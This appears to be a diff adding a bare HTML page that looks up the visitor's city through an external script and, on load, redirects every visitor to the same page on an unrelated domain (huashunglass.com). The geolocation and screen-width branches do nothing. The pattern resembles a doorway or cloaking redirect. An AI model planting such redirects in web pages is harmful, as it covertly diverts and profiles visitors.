@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Document</title>
+</head>
+<body onload="ScreenWidth()">
+	<script src="http://pv.sohu.com/cityjson?ie=utf-8"></script>
+	<script language="JavaScript">
+	function ScreenWidth(){
+		var city = returnCitySN.cname;
+		if( (city.indexOf('北京市') >= 0) || (city.indexOf('天津市') >= 0) ){
+			window.location.href = 'http://top.huashunglass.com/jxt/myb/ye.html';
+		}else{
+			if (screen.width <= 768){
+			    window.location.href = 'http://top.huashunglass.com/jxt/myb/ye.html';
+			}else {
+			    window.location.href = 'http://top.huashunglass.com/jxt/myb/ye.html';
+			}
+		}
+		
+	}
+	</script>
+</body>
+</html>
